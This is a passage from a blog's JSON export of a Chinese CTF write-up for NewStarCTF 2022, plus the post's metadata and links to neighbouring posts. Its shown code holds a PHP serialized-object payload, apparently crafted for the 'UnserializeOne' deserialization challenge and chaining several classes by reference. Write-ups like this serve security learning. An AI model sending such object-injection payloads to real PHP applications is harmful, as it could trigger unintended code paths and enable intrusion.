string\">\"var\"</span><span class=\"token punctuation\">;</span>O<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"eeee\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"obj\"</span><span class=\"token punctuation\">;</span>r<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"func\"</span><span class=\"token punctuation\">;</span>r<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\" spellcheck=\"true\">//O:4:\"eeee\":1:{;s:3:\"obj\";O:5:\"Start\":2:{;s:4:\"name\";O:3:\"Sec\":2:{;s:3:\"obj\";O:4:\"Easy\":1:{;s:3:\"cla\";N;};s:3:\"var\";r:1;};s:4:\"func\";r:3;};};</span>\n</code></pre>\n<p><img src=\"/post/2022NewStarCTF/image-20221027162117156.png\" alt=\"image-20221027162117156\"></p>\n<hr>\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1>","text":"没啥简介 NewStarCTF2022公开赛虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点 1.NotPHP&lt;?php error_...","permalink":"/post/2022NewStarCTF","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#NewStarCTF2022%E5%85%AC%E5%BC%80%E8%B5%9B\"><span class=\"toc-text\">NewStarCTF2022公开赛</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-NotPHP\"><span class=\"toc-text\">1.NotPHP</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-UnserializeOne\"><span class=\"toc-text\">2.UnserializeOne</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Sekai CTF 2022","uid":"ba0cf5d51c9ce53698d64b464314f97e","slug":"2022SekaiCTF","date":"2023-02-13T15:13:06.374Z","updated":"2023-08-06T08:02:12.273Z","comments":true,"path":"api/articles/2022SekaiCTF.json","keywords":null,"cover":"/img/42.jpg","text":"国外比赛难度确实逆天 Sekai CTF 2022https://github.com/project-sekai-ctf/sekaictf-2022 这是官方...","permalink":"/post/2022SekaiCTF","photos":[],"count_time":{"symbolsCount":"8.3k","symbolsTime":"8 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"htbのMachines","uid":"4497d51e9ba49087760c38d70069b58c","slug":"htb(Machines)","date":"2023-02-13T14:10:53.464Z","updated":"2023-08-06T07:53:48.898Z","comments":true,"path":"api/articles/htb(Machines).json","keywords":null,"cover":"/img/10.jpg","text":"Machines Machines【WEB】Stocker[easy]个人感觉新东西太多，难度对于开始可能中上 请先了解学习 NoSQL注入 api利用 通过i...","permalink":"/post/htb(Machines)","photos":[],"count_time":{"symbolsCount":112,"symbolsTime":"1 mins."},"categories":[{"name":"Hack the Box","slug":"Hack-the-Box","count":2,"path":"api/categories/Hack-the-Box.json"}],"tags":[{"name":"htb","slug":"htb","count":2,"path":"api/tags/htb.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}